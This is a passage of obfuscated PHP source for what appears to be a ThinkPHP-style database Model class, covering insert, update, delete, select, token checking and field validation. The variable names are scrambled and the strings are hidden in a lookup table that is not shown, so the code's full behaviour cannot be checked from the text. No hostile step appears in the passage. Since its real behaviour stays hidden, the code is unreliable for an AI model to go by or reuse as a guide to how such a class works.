$this->{$¡”àïÒÖ}); } } return $this->_extModel; } public function __set($¥·¼Ï‚ğ, $ƒï©ÓÃà) { $this->data[$¥·¼Ï‚ğ] = $ƒï©ÓÃà; } public function __get($²‘Ê ½‹) { return isset($this->data[$²‘Ê ½‹]) ? $this->data[$²‘Ê ½‹] : null; } public function __isset($í“óï«Ñ) { return isset($this->data[$í“óï«Ñ]); } public function __unset($«ÖóîÀ) { unset($this->data[$«ÖóîÀ]); } public function __call($öã¿íç’, $¡‰Ï—ç) { $ÅŠö˜Š· =& $_SERVER[¼¥ÊĞÙÌ]; if (in_array(strtolower($öã¿íç’), $this->methods, !0)) { $this->options[strtolower($öã¿íç’)] = $¡‰Ï—ç[0]; return $this; } elseif (in_array(strtolower($öã¿íç’), array($ÅŠö˜Š·[335], $ÅŠö˜Š·[336], $ÅŠö˜Š·[337], $ÅŠö˜Š·[338], $ÅŠö˜Š·[339]), !0)) { $¿ÖÅÌâò = isset($¡‰Ï—ç[0]) ? $¡‰Ï—ç[0] : $ÅŠö˜Š·[223]; $¿ÖÅÌâò = $this->db->parseKey($¿ÖÅÌâò); return $this->getField(strtoupper($öã¿íç’) . $ÅŠö˜Š·[340] . $¿ÖÅÌâò . $ÅŠö˜Š·[341] . $öã¿íç’, $ÅŠö˜Š·[335]); } elseif (strtolower(substr($öã¿íç’, 0, 5)) == $ÅŠö˜Š·[342]) { $¿ÖÅÌâò = think_parse_name(substr($öã¿íç’, 5)); $‚®¥Ú•ß[$¿ÖÅÌâò] = $¡‰Ï—ç[0]; return $this->where($‚®¥Ú•ß)->find(); } elseif (strtolower(substr($öã¿íç’, 0, 10)) == $ÅŠö˜Š·[343]) { $àÃé¼Æç = think_parse_name(substr($öã¿íç’, 10)); $‚®¥Ú•ß[$àÃé¼Æç] = $¡‰Ï—ç[0]; return $this->where($‚®¥Ú•ß)->getField($¡‰Ï—ç[1]); } elseif (isset($this->_scope[$öã¿íç’])) { return $this->scope($öã¿íç’, $¡‰Ï—ç[0]); } elseif (method_exists($this, $öã¿íç’)) { array_unshift($¡‰Ï—ç, $öã¿íç’); return call_user_func_array(array($this, $ÅŠö˜Š·[344]), $¡‰Ï—ç); } else { return call_user_func_array(array(parent, $öã¿íç’), $¡‰Ï—ç); } } protected function call() { $ş“áüÒä =& $_SERVER[¼¥ÊĞÙÌ]; $¨Ì®ôşº = func_get_args(); $¤×Ö•¦ = array_shift($¨Ì®ôşº); $Ï¹Î¡Âˆ = $¤×Ö•¦; if (is_array($¤×Ö•¦)) { $Ï¹Î¡Âˆ = $¤×Ö•¦[1]; $¤×Ö•¦ = $¤×Ö•¦[0]; } $™¡¼âàã = count($¨Ì®ôşº) - 1; if (isset($¨Ì®ôşº[$™¡¼âàã]) && $¨Ì®ôşº[$™¡¼âàã] === $¤×Ö•¦) { think_exception(__CLASS__ . $ş“áüÒä[4] . $¤×Ö•¦ . think_lang($ş“áüÒä[345])); return; } $¨Ì®ôşº[] = $¤×Ö•¦; if (method_exists($this, $ş“áüÒä[346])) { $­íƒå§½ = call_user_func_array(array($this, $ş“áüÒä[347]), array($Ï¹Î¡Âˆ, $¨Ì®ôşº)); if (!is_null($­íƒå§½) && $­íƒå§½ !== !1) { return $­íƒå§½; } } $…è¸¾Å = call_user_func_array(array($this, $¤×Ö•¦), $¨Ì®ôşº); if (method_exists($this, $ş“áüÒä[348])) { $­íƒå§½ = call_user_func_array(array($this, $ş“áüÒä[349]), array($Ï¹Î¡Âˆ, $¨Ì®ôşº, $…è¸¾Å)); if ($­íƒå§½) { return $­íƒå§½; } } return $…è¸¾Å; } protected function _initialize() { } protected function _facade($å¥Îşû) { $ ›¤ò‡ğ =& $_SERVER[¼¥ÊĞÙÌ]; if (!empty($this->fields)) { foreach ($å¥Îşû as $çËñ¤† => $š¯èëÚÕ) { if (is_array($this->fields) && !in_array($çËñ¤†, $this->fields, !0)) { unset($å¥Îşû[$çËñ¤†]); } elseif (is_scalar($š¯èëÚÕ)) { $this->_parseType($å¥Îşû, $çËñ¤†); } } } if (!empty($this->options[$ ›¤ò‡ğ[350]])) { $å¥Îşû = array_map($this->options[$ ›¤ò‡ğ[350]], $å¥Îşû); unset($this->options[$ ›¤ò‡ğ[350]]); } $this->_beforeWrite($å¥Îşû); return $å¥Îşû; } protected function _beforeWrite(&$šÌ÷¾Üë) { } public function add($“áŸ¯ÏÔ = '', $¢Á×Ä·Ö = array(), $Æµ½íß = false) { if (empty($“áŸ¯ÏÔ)) { if (!empty($this->data)) { $“áŸ¯ÏÔ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¼¥ÊĞÙÌ][351]); return !1; } } $¢Á×Ä·Ö = $this->_parseOptions($¢Á×Ä·Ö); $“áŸ¯ÏÔ = $this->_facade($“áŸ¯ÏÔ); if (!1 === $this->_beforeInsert($“áŸ¯ÏÔ, $¢Á×Ä·Ö)) { return !1; } $‘íÚØú‰ = $this->db->insert($“áŸ¯ÏÔ, $¢Á×Ä·Ö, $Æµ½íß); if (!1 !== $‘íÚØú‰) { $ÙçèÍÅ¬ = $this->getLastInsID(); if ($ÙçèÍÅ¬) { $“áŸ¯ÏÔ[$this->getPk()] = $ÙçèÍÅ¬; $this->_after_insert($“áŸ¯ÏÔ, $¢Á×Ä·Ö); return $ÙçèÍÅ¬; } $this->_after_insert($“áŸ¯ÏÔ, $¢Á×Ä·Ö); } return $‘íÚØú‰; } protected function _beforeInsert(&$„É¾¡Ê , $Õ•„Ù) { } protected function _after_insert($¡õï‹Äß, $é†·Ó½Õ) { } public function addAll($íğË©Àš, $Ä‹×ò = array(), $ê»áµ³â = false) { $ÓøÚÓ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($íğË©Àš)) { $this->error = think_lang($ÓøÚÓ[351]); return !1; } $Ä‹×ò = $this->_parseOptions($Ä‹×ò); foreach ($íğË©Àš as $º´Óíîã => $€òˆ±ÈÍ) { $íğË©Àš[$º´Óíîã] = $this->_facade($€òˆ±ÈÍ); } if (method_exists($this->db, $ÓøÚÓ[352])) { $«¢™Øö = $this->db->insertAll($íğË©Àš, $Ä‹×ò, $ê»áµ³â); } else { $this->startTrans(); foreach ($íğË©Àš as $º´Óíîã => $€òˆ±ÈÍ) { $«¢™Øö = $this->db->insert($€òˆ±ÈÍ, $Ä‹×ò, $ê»áµ³â); } $this->commit(); } if (!1 !== $«¢™Øö) { $ ÎÛ¶éŒ = $this->getLastInsID(); if ($ ÎÛ¶éŒ) { return $ ÎÛ¶éŒ; } } return $«¢™Øö; } public function selectAdd($ô‘ê€ÁÏ = '', $ùÏÖ’Ş = '', $ŞùÚéá§ = array()) { $ÜÍÎÒœë =& $_SERVER[¼¥ÊĞÙÌ]; $ŞùÚéá§ = $this->_parseOptions($ŞùÚéá§); if (!1 === ($º„ÒÙÀ× = $this->db->selectInsert($ô‘ê€ÁÏ ? $ô‘ê€ÁÏ : $ŞùÚéá§[$ÜÍÎÒœë[353]], $ùÏÖ’Ş ? $ùÏÖ’Ş : $this->getTableName(), $ŞùÚéá§))) { $this->error = think_lang($ÜÍÎÒœë[354]); return !1; } else { return $º„ÒÙÀ×; } } public function save($ëÜ®îùÇ = '', $‚ÊÈï²‚ = array()) { $ç¿ø‰ˆ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($ëÜ®îùÇ)) { if (!empty($this->data)) { $ëÜ®îùÇ = $this->data; $this->data = array(); } else { $this->error = think_lang($ç¿ø‰ˆ[351]); return !1; } } $ëÜ®îùÇ = $this->_facade($ëÜ®îùÇ); $‚ÊÈï²‚ = $this->_parseOptions($‚ÊÈï²‚); $¡¿ ù²“ = $this->getPk(); if (!isset($‚ÊÈï²‚[$ç¿ø‰ˆ[355]])) { if (isset($ëÜ®îùÇ[$¡¿ ù²“])) { $¤™ÜİšÑ[$¡¿ ù²“] = $ëÜ®îùÇ[$¡¿ ù²“]; $‚ÊÈï²‚[$ç¿ø‰ˆ[355]] = $¤™ÜİšÑ; unset($ëÜ®îùÇ[$¡¿ ù²“]); } else { $this->error = think_lang($ç¿ø‰ˆ[354]); return !1; } } if (is_array($‚ÊÈï²‚[$ç¿ø‰ˆ[355]]) && isset($‚ÊÈï²‚[$ç¿ø‰ˆ[355]][$¡¿ ù²“])) { $§Úº²Óˆ = $‚ÊÈï²‚[$ç¿ø‰ˆ[355]][$¡¿ ù²“]; } if (!1 === $this->_beforeUpdate($ëÜ®îùÇ, $‚ÊÈï²‚)) { return !1; } $¾Â«Ì‰Ô = $this->db->update($ëÜ®îùÇ, $‚ÊÈï²‚); if (!1 !== $¾Â«Ì‰Ô) { if (isset($§Úº²Óˆ)) { $ëÜ®îùÇ[$¡¿ ù²“] = $§Úº²Óˆ; } $this->_afterUpdate($ëÜ®îùÇ, $‚ÊÈï²‚); } return $¾Â«Ì‰Ô; } protected function _beforeUpdate(&$“‚£•½, $Òõ¡¯ŠÏ) { } protected function _afterUpdate($ï÷¥‰·º, $ÄÅŒÔñ´) { } public function delete($ë€¨Ô õ = array()) { $µ¨ÂêıÍ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($ë€¨Ô õ) && empty($this->options[$µ¨ÂêıÍ[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $®ô–¡ë = $this->getPk(); if (is_numeric($ë€¨Ô õ) || is_string($ë€¨Ô õ)) { if (strpos($ë€¨Ô õ, $µ¨ÂêıÍ[50])) { $¢ ¦æÀ”[$®ô–¡ë] = array($µ¨ÂêıÍ[356], $ë€¨Ô õ); } else { $¢ ¦æÀ”[$®ô–¡ë] = $ë€¨Ô õ; } $this->options[$µ¨ÂêıÍ[355]] = $¢ ¦æÀ”; } $ë€¨Ô õ = $this->_parseOptions(); if (is_array($ë€¨Ô õ[$µ¨ÂêıÍ[355]]) && isset($ë€¨Ô õ[$µ¨ÂêıÍ[355]][$®ô–¡ë])) { $ÓÊ£âÍê = $ë€¨Ô õ[$µ¨ÂêıÍ[355]][$®ô–¡ë]; } $Çø’‚ó = $this->db->delete($ë€¨Ô õ); if (!1 !== $Çø’‚ó) { $š ¡×Ÿˆ = array(); if (isset($ÓÊ£âÍê)) { $š ¡×Ÿˆ[$®ô–¡ë] = $ÓÊ£âÍê; } $this->_after_delete($š ¡×Ÿˆ, $ë€¨Ô õ); } return $Çø’‚ó; } protected function _after_delete($£ºƒ©ú’, $éó–ÆËñ) { } public function select($ëàíÔìª = array()) { $Õ¬Ç€© =& $_SERVER[¼¥ÊĞÙÌ]; if (is_string($ëàíÔìª) || is_numeric($ëàíÔìª)) { $æ¸õÊÇÁ = $this->getPk(); if (strpos($ëàíÔìª, $Õ¬Ç€©[50])) { $¶”‰Œ¸¿[$æ¸õÊÇÁ] = array($Õ¬Ç€©[356], $ëàíÔìª); } else { $¶”‰Œ¸¿[$æ¸õÊÇÁ] = $ëàíÔìª; } $this->options[$Õ¬Ç€©[355]] = $¶”‰Œ¸¿; } elseif (!1 === $ëàíÔìª) { $ëàíÔìª = $this->_parseOptions(); return $Õ¬Ç€©[357] . $this->db->buildSelectSql($ëàíÔìª) . $Õ¬Ç€©[358]; } $ëàíÔìª = $this->_parseOptions(); $˜œŸ‚ñ = $this->db->select($ëàíÔìª); if (!1 === $˜œŸ‚ñ) { return !1; } if (empty($˜œŸ‚ñ)) { return null; } $this->_afterSelect($˜œŸ‚ñ, $ëàíÔìª); return $˜œŸ‚ñ; } protected function _afterSelect(&$»ĞŞˆ°, $¯Œ¤íô) { } public function buildSql($ˆÜúÎ™¸ = array()) { $Š†Ò–Şì =& $_SERVER[¼¥ÊĞÙÌ]; $ˆÜúÎ™¸ = $this->_parseOptions($ˆÜúÎ™¸); return $Š†Ò–Şì[357] . $this->db->buildSelectSql($ˆÜúÎ™¸) . $Š†Ò–Şì[358]; } public function optionsValue($®šá¤´ = null) { if (is_null($®šá¤´)) { return $this->options; } elseif (is_array($®šá¤´)) { $this->options = array_merge($this->options, $®šá¤´); } } protected function _parseOptions($¬Ç«Â¥ = array()) { $®ô§¿‘ =& $_SERVER[¼¥ÊĞÙÌ]; if (is_array($¬Ç«Â¥)) { $¬Ç«Â¥ = array_merge($this->options, $¬Ç«Â¥); } $this->options = array(); if (!isset($¬Ç«Â¥[$®ô§¿‘[359]])) { $¬Ç«Â¥[$®ô§¿‘[359]] = $this->getTableName(); $¼ŠÔ®Ø = $this->fields; } else { $¼ŠÔ®Ø = $this->getDbFields(); } if (!empty($¬Ç«Â¥[$®ô§¿‘[360]])) { $¬Ç«Â¥[$®ô§¿‘[359]] .= $®ô§¿‘[53] . $¬Ç«Â¥[$®ô§¿‘[360]]; } $¬Ç«Â¥[$®ô§¿‘[361]] = $this->name; if (isset($¬Ç«Â¥[$®ô§¿‘[355]]) && is_array($¬Ç«Â¥[$®ô§¿‘[355]]) && !empty($¼ŠÔ®Ø) && !isset($¬Ç«Â¥[$®ô§¿‘[362]]) && !isset($¬Ç«Â¥[$®ô§¿‘[359]])) { foreach ($¬Ç«Â¥[$®ô§¿‘[355]] as $¢úü‰¸ => $›î²‘ á) { $¢úü‰¸ = trim($¢úü‰¸); if (in_array($¢úü‰¸, $¼ŠÔ®Ø, !0)) { if (is_scalar($›î²‘ á)) { $this->_parseType($¬Ç«Â¥[$®ô§¿‘[355]], $¢úü‰¸); } } elseif (!is_numeric($¢úü‰¸) && $®ô§¿‘[11] != substr($¢úü‰¸, 0, 1) && !1 === strpos($¢úü‰¸, $®ô§¿‘[10]) && !1 === strpos($¢úü‰¸, $®ô§¿‘[340]) && !1 === strpos($¢úü‰¸, $®ô§¿‘[215]) && !1 === strpos($¢úü‰¸, $®ô§¿‘[287])) { unset($¬Ç«Â¥[$®ô§¿‘[355]][$¢úü‰¸]); } } } $this->_options_filter($¬Ç«Â¥); return $¬Ç«Â¥; } protected function _options_filter(&$‡¹µÔ‚) { } protected function _parseType(&$ÆÁÔ—“, $”İØÃ†Œ) { $ù®ÄÛÊÉ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($this->options[$ù®ÄÛÊÉ[363]][$ù®ÄÛÊÉ[4] . $”İØÃ†Œ])) { $¼¸ıñ· = strtolower($this->fields[$ù®ÄÛÊÉ[332]][$”İØÃ†Œ]); if (!1 !== strpos($¼¸ıñ·, $ù®ÄÛÊÉ[364])) { } elseif (!1 === strpos($¼¸ıñ·, $ù®ÄÛÊÉ[365]) && !1 !== strpos($¼¸ıñ·, $ù®ÄÛÊÉ[366])) { $ÆÁÔ—“[$”İØÃ†Œ] = intval($ÆÁÔ—“[$”İØÃ†Œ]); } elseif (!1 !== strpos($¼¸ıñ·, $ù®ÄÛÊÉ[367]) || !1 !== strpos($¼¸ıñ·, $ù®ÄÛÊÉ[368])) { $ÆÁÔ—“[$”İØÃ†Œ] = floatval($ÆÁÔ—“[$”İØÃ†Œ]); } elseif (!1 !== strpos($¼¸ıñ·, $ù®ÄÛÊÉ[369])) { $ÆÁÔ—“[$”İØÃ†Œ] = (bool) $ÆÁÔ—“[$”İØÃ†Œ]; } } } public function find($éøÚ×éÚ = array()) { $¡úş¸„î =& $_SERVER[¼¥ÊĞÙÌ]; if (is_numeric($éøÚ×éÚ) || is_string($éøÚ×éÚ)) { $²„¡ª »[$this->getPk()] = intval($éøÚ×éÚ); $this->options[$¡úş¸„î[355]] = $²„¡ª »; } $this->options[$¡úş¸„î[370]] = 1; $éøÚ×éÚ = $this->_parseOptions(); $Ç¡º™Ü = $this->db->select($éøÚ×éÚ); if (!1 === $Ç¡º™Ü) { return !1; } if (empty($Ç¡º™Ü)) { return null; } $this->data = $Ç¡º™Ü[0]; $this->_afterFind($this->data, $éøÚ×éÚ); if (!empty($this->options[$¡úş¸„î[371]])) { return $this->returnResult($this->data, $this->options[$¡úş¸„î[371]]); } return $this->data; } protected function _afterFind(&$´çœ˜–, $åÁ¬®²Ó) { } protected function returnResult($”â¯ÇÇš, $ˆÏñ‹À“ = '') { $¯æ÷ĞÖ¢ =& $_SERVER[¼¥ÊĞÙÌ]; if ($ˆÏñ‹À“) { if (is_callable($ˆÏñ‹À“)) { return call_user_func($ˆÏñ‹À“, $”â¯ÇÇš); } switch (strtolower($ˆÏñ‹À“)) { case $¯æ÷ĞÖ¢[372]: return json_encode($”â¯ÇÇš); case $¯æ÷ĞÖ¢[373]: return xml_encode($”â¯ÇÇš); } } return $”â¯ÇÇš; } public function parseFieldsMap($¸…ªŸ¡ø, $Ğ°¿šÏ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÙÆ˜Õ°å => $Ó¬ßÄ©“) { if ($Ğ°¿šÏ == 1) { if (isset($¸…ªŸ¡ø[$Ó¬ßÄ©“])) { $¸…ªŸ¡ø[$ÙÆ˜Õ°å] = $¸…ªŸ¡ø[$Ó¬ßÄ©“]; unset($¸…ªŸ¡ø[$Ó¬ßÄ©“]); } } else { if (isset($¸…ªŸ¡ø[$ÙÆ˜Õ°å])) { $¸…ªŸ¡ø[$Ó¬ßÄ©“] = $¸…ªŸ¡ø[$ÙÆ˜Õ°å]; unset($¸…ªŸ¡ø[$ÙÆ˜Õ°å]); } } } } return $¸…ªŸ¡ø; } public function setField($ÀŞïİø°, $ÔÕ¨¬Ïê = '') { if (is_array($ÀŞïİø°)) { $³Ø‰Ë±¨ = $ÀŞïİø°; } else { $³Ø‰Ë±¨[$ÀŞïİø°] = $ÔÕ¨¬Ïê; } return $this->save($³Ø‰Ë±¨); } public function setAdd($Ò¿Ç”, $ÉºÕ®†´ = 1) { $ËÏ™¥“Ò =& $_SERVER[¼¥ÊĞÙÌ]; $‚ …Œç = $Ò¿Ç” . $ËÏ™¥“Ò[374] . $ÉºÕ®†´; if ($ÉºÕ®†´ < 0) { $‚ …Œç = $Ò¿Ç” . $ÉºÕ®†´; } return $this->setField($Ò¿Ç”, array($ËÏ™¥“Ò[375], $‚ …Œç)); } public function getField($¥Œ¾Üì˜, $ß®ƒ÷ = null) { $Åò£Àô =& $_SERVER[¼¥ÊĞÙÌ]; $Ï–şƒˆ·[$Åò£Àô[353]] = $¥Œ¾Üì˜; $Ï–şƒˆ· = $this->_parseOptions($Ï–şƒˆ·); $¥Œ¾Üì˜ = trim($¥Œ¾Üì˜); if (strpos($¥Œ¾Üì˜, $Åò£Àô[50])) { if (!isset($Ï–şƒˆ·[$Åò£Àô[370]])) { $Ï–şƒˆ·[$Åò£Àô[370]] = is_numeric($ß®ƒ÷) ? $ß®ƒ÷ : $Åò£Àô[12]; } $èüĞ§¼ğ = $this->db->select($Ï–şƒˆ·); if (!empty($èüĞ§¼ğ)) { $™ñ•õÔø = explode($Åò£Àô[50], $¥Œ¾Üì˜); $¥Œ¾Üì˜ = array_keys($èüĞ§¼ğ[0]); $ÂèÙÄ–¶ = array_shift($¥Œ¾Üì˜); $ÌÊñßÈü = array_shift($¥Œ¾Üì˜); $ÍÙó®™… = array(); $Îßâ«µÓ = count($™ñ•õÔø); foreach ($èüĞ§¼ğ as $Ï‹ÓÎÚÕ) { $‘ ÁŞıò = $Ï‹ÓÎÚÕ[$ÂèÙÄ–¶]; if (2 == $Îßâ«µÓ) { $ÍÙó®™…[$‘ ÁŞıò] = $Ï‹ÓÎÚÕ[$ÌÊñßÈü]; } else { $ÍÙó®™…[$‘ ÁŞıò] = is_string($ß®ƒ÷) ? implode($ß®ƒ÷, $Ï‹ÓÎÚÕ) : $Ï‹ÓÎÚÕ; } } return $ÍÙó®™…; } } else { if (!0 !== $ß®ƒ÷) { $Ï–şƒˆ·[$Åò£Àô[370]] = is_numeric($ß®ƒ÷) ? $ß®ƒ÷ : 1; } if ($ß®ƒ÷ === $Åò£Àô[335]) { unset($Ï–şƒˆ·[$Åò£Àô[370]]); } $Ï‹ÓÎÚÕ = $this->db->select($Ï–şƒˆ·); if (!empty($Ï‹ÓÎÚÕ)) { if ($ß®ƒ÷ === $Åò£Àô[335]) { return reset($Ï‹ÓÎÚÕ[0]); } if (!0 !== $ß®ƒ÷ && 1 == $Ï–şƒˆ·[$Åò£Àô[370]]) { return reset($Ï‹ÓÎÚÕ[0]); } foreach ($Ï‹ÓÎÚÕ as $©£È˜¼§) { $øı¤ù´[] = $©£È˜¼§[$¥Œ¾Üì˜]; } return $øı¤ù´; } } return null; } public function create($‚‡í·•ó = '', $­ù©Š¼ = '') { $¿¯’ùÈ¨ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($‚‡í·•ó)) { $‚‡í·•ó = $_POST; } elseif (is_object($‚‡í·•ó)) { $‚‡í·•ó = get_object_vars($‚‡í·•ó); } if (empty($‚‡í·•ó) || !is_array($‚‡í·•ó)) { $this->error = think_lang($¿¯’ùÈ¨[351]); return !1; } $‚‡í·•ó = $this->parseFieldsMap($‚‡í·•ó, 0); $­ù©Š¼ = $­ù©Š¼ ? $­ù©Š¼ : (!empty($‚‡í·•ó[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¿¯’ùÈ¨[353]])) { $ıÚÓ¼´ = $this->options[$¿¯’ùÈ¨[353]]; unset($this->options[$¿¯’ùÈ¨[353]]); } elseif ($­ù©Š¼ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ıÚÓ¼´ = $this->insertFields; } elseif ($­ù©Š¼ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ıÚÓ¼´ = $this->updateFields; } if (isset($ıÚÓ¼´)) { if (is_string($ıÚÓ¼´)) { $ıÚÓ¼´ = explode($¿¯’ùÈ¨[50], $ıÚÓ¼´); } if (think_config($¿¯’ùÈ¨[376])) { $ıÚÓ¼´[] = think_config($¿¯’ùÈ¨[377]); } foreach ($‚‡í·•ó as $òù˜Îßš => $û»œØı’) { if (!in_array($òù˜Îßš, $ıÚÓ¼´)) { unset($‚‡í·•ó[$òù˜Îßš]); } } } if (!$this->autoValidation($‚‡í·•ó, $­ù©Š¼)) { return !1; } if (!$this->autoCheckToken($‚‡í·•ó)) { $this->error = think_lang($¿¯’ùÈ¨[378]); return !1; } if ($this->autoCheckFields) { $ıÚÓ¼´ = $this->getDbFields(); foreach ($‚‡í·•ó as $òù˜Îßš => $û»œØı’) { if (!in_array($òù˜Îßš, $ıÚÓ¼´)) { unset($‚‡í·•ó[$òù˜Îßš]); } elseif (MAGIC_QUOTES_GPC && is_string($û»œØı’)) { $‚‡í·•ó[$òù˜Îßš] = stripslashes($û»œØı’); } } } $this->autoOperation($‚‡í·•ó, $­ù©Š¼); $this->data = $‚‡í·•ó; return $‚‡í·•ó; } public function autoCheckToken($õ¦±¼Ò®) { $¨Óª³Ìµ =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($this->options[$¨Óª³Ìµ[379]]) && !$this->options[$¨Óª³Ìµ[379]]) { return !0; } if (think_config($¨Óª³Ìµ[376])) { $—¸ŞÄ˜ = think_config($¨Óª³Ìµ[377]); if (!isset($õ¦±¼Ò®[$—¸ŞÄ˜]) || Session::get($—¸ŞÄ˜)) { return !1; } list($†±ô‘Ü, $¶ÁêèµÜ) = explode($¨Óª³Ìµ[11], $õ¦±¼Ò®[$—¸ŞÄ˜]); if ($¶ÁêèµÜ && Session::get($—¸ŞÄ˜ . $¨Óª³Ìµ[10] . $†±ô‘Ü) === $¶ÁêèµÜ) { Session::remove($—¸ŞÄ˜ . $¨Óª³Ìµ[10] . $†±ô‘Ü); return !0; } if (think_config($¨Óª³Ìµ[380])) { Session::remove($—¸ŞÄ˜ . $¨Óª³Ìµ[10] . $†±ô‘Ü); } return !1; } return !0; } public function regex($ì’€«µù, $Î„”‚¬) { $­¡¬¤˜ã =& $_SERVER[¼¥ÊĞÙÌ]; $ÃêãÀ™ = array($­¡¬¤˜ã[381] => $­¡¬¤˜ã[382], $­¡¬¤˜ã[383] => $­¡¬¤˜ã[384], $­¡¬¤˜ã[385] => $­¡¬¤˜ã[386], $­¡¬¤˜ã[387] => $­¡¬¤˜ã[388], $­¡¬¤˜ã[389] => $­¡¬¤˜ã[390], $­¡¬¤˜ã[391] => $­¡¬¤˜ã[392], $­¡¬¤˜ã[393] => $­¡¬¤˜ã[394], $­¡¬¤˜ã[368] => $­¡¬¤˜ã[395], $­¡¬¤˜ã[396] => $­¡¬¤˜ã[397]); if (isset($ÃêãÀ™[strtolower($Î„”‚¬)])) { $Î„”‚¬ = $ÃêãÀ™[strtolower($Î„”‚¬)]; } return preg_match($Î„”‚¬, $ì’€«µù) === 1; } private function autoOperation(&$‰ûÒ„¿¢, $é¬¾ÙŒ†) { $öôª« =& $_SERVER[¼¥ÊĞÙÌ]; if (!empty($this->options[$öôª«[398]])) { $ü×ûÚÊŒ = $this->options[$öôª«[398]]; unset($this->options[$öôª«[398]]); } elseif (!empty($this->_auto)) { $ü×ûÚÊŒ = $this->_auto; } if (isset($ü×ûÚÊŒ)) { foreach ($ü×ûÚÊŒ as $±ªŠ¢£) { if (empty($±ªŠ¢£[2])) { $±ªŠ¢£[2] = THINK_MODEL_INSERT; } if ($é¬¾ÙŒ† == $±ªŠ¢£[2] || $±ªŠ¢£[2] == THINK_MODEL_BOTH) { switch (trim($±ªŠ¢£[3])) { case $öôª«[399]: case $öôª«[400]: $ÛÅº«Ñ = isset($±ªŠ¢£[4]) ? (array) $±ªŠ¢£[4] : array(); if (isset($‰ûÒ„¿¢[$±ªŠ¢£[0]])) { array_unshift($ÛÅº«Ñ, $‰ûÒ„¿¢[$±ªŠ¢£[0]]); } if ($öôª«[399] == $±ªŠ¢£[3]) { $‰ûÒ„¿¢[$±ªŠ¢£[0]] = call_user_func_array($±ªŠ¢£[1], $ÛÅº«Ñ); } else { $‰ûÒ„¿¢[$±ªŠ¢£[0]] = call_user_func_array(array(&$this, $±ªŠ¢£[1]), $ÛÅº«Ñ); } break; case $öôª«[353]: $‰ûÒ„¿¢[$±ªŠ¢£[0]] = $‰ûÒ„¿¢[$±ªŠ¢£[1]]; break; case $öôª«[401]: if ($öôª«[12] === $‰ûÒ„¿¢[$±ªŠ¢£[0]]) { unset($‰ûÒ„¿¢[$±ªŠ¢£[0]]); } break; case $öôª«[402]: default: $‰ûÒ„¿¢[$±ªŠ¢£[0]] = $±ªŠ¢£[1]; } if (!1 === $‰ûÒ„¿¢[$±ªŠ¢£[0]]) { unset($‰ûÒ„¿¢[$±ªŠ¢£[0]]); } } } } return $‰ûÒ„¿¢; } protected function autoValidation($Æ’À“», $§—«ìùÓ) { $Êµ„²Ñã =& $_SERVER[¼¥ÊĞÙÌ]; if (!empty($this->options[$Êµ„²Ñã[403]])) { $ÂŸ®½€ = $this->options[$Êµ„²Ñã[403]]; unset($this->options[$Êµ„²Ñã[403]]); } elseif (!empty($this->_validate)) { $ÂŸ®½€ = $this->_validate; } if (isset($ÂŸ®½€)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÂŸ®½€ as $Ø§©ıáÖ => $Ä§Ûë‘õ) { if (empty($Ä§Ûë‘õ[5]) || $Ä§Ûë‘õ[5] == THINK_MODEL_BOTH || $Ä§Ûë‘õ[5] == $§—«ìùÓ) { if (0 == strpos($Ä§Ûë‘õ[2], $Êµ„²Ñã[404]) && strpos($Ä§Ûë‘õ[2], $Êµ„²Ñã[405])) { $Ä§Ûë‘õ[2] = think_lang(substr($Ä§Ûë‘õ[2], 2, -1)); } $Ä§Ûë‘õ[3] = isset($Ä§Ûë‘õ[3]) ? $Ä§Ûë‘õ[3] : THINK_EXISTS_VALIDATE; $Ä§Ûë‘õ[4] = isset($Ä§Ûë‘õ[4]) ? $Ä§Ûë‘õ[4] : $Êµ„²Ñã[406]; switch ($Ä§Ûë‘õ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Æ’À“», $Ä§Ûë‘õ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Êµ„²Ñã[12] != trim($Æ’À“»[$Ä§Ûë‘õ[0]])) { if (!1 === $this->_validationField($Æ’À“», $Ä§Ûë‘õ)) { return !1; } } break; default: if (isset($Æ’À“»[$Ä§Ûë‘õ[0]])) { if (!1 === $this->_validationField($Æ’À“», $Ä§Ûë‘õ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($âÏ×ˆö, $·³äÇü­) { if (!1 === $this->_validationFieldItem($âÏ×ˆö, $·³äÇü­)) { if ($this->patchValidate) { $this->error[$·³äÇü­[0]] = $·³äÇü­[2]; } else { $this->error = $·³äÇü­[2]; return !1; } } return; } protected function _validationFieldItem($İìÌ¬íŠ, $‹®‘èŒ’) { $ĞÈÎşú¸ =& $_SERVER[¼¥ÊĞÙÌ]; switch (strtolower(trim($‹®‘èŒ’[4]))) { case $ĞÈÎşú¸[399]: case $ĞÈÎşú¸[400]: $Í•Ê•Ìš = isset($‹®‘èŒ’[6]) ? (array) $‹®‘èŒ’[6] : array(); if (is_string($‹®‘èŒ’[0]) && strpos($‹®‘èŒ’[0], $ĞÈÎşú¸[50])) { $‹®‘èŒ’[0] = explode($ĞÈÎşú¸[50], $‹®‘èŒ’[0]); } if (is_array($‹®‘èŒ’[0])) { foreach ($‹®‘èŒ’[0] as $ÑÉ£îàç) { $îØŠ¾ÚØ[$ÑÉ£îàç] = $İìÌ¬íŠ[$ÑÉ£îàç]; } array_unshift($Í•Ê•Ìš, $îØŠ¾ÚØ); } else { array_unshift($Í•Ê•Ìš, $İìÌ¬íŠ[$‹®‘èŒ’[0]]); } if ($ĞÈÎşú¸[399] == $‹®‘èŒ’[4]) { return call_user_func_array($‹®‘èŒ’[1], $Í•Ê•Ìš); } else { return call_user_func_array(array(&$this, $‹®‘èŒ’[1]), $Í•Ê•Ìš); } case $ĞÈÎşú¸[407]: return $İìÌ¬íŠ[$‹®‘èŒ’[0]] == $İìÌ¬íŠ[$‹®‘èŒ’[1]]; case 